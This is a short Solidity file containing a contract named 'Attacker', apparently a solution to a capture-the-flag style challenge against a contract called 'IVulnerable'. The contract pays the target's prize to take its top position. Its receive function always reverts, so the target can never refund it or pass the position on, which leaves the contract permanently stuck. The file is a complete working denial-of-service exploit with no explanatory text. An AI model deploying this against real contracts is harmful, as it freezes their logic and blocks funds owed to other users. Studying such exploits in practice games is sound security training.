// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function prize() external view returns (uint);
}

contract Attacker {
    IVulnerable public target;

    constructor(address _target) payable {
        target = IVulnerable(_target);
    }

    receive() external payable {
        revert("Don't you dare beat me!");
    }

    function exploit() public payable {
        address(target).call{value: target.prize()}("");
    }
}
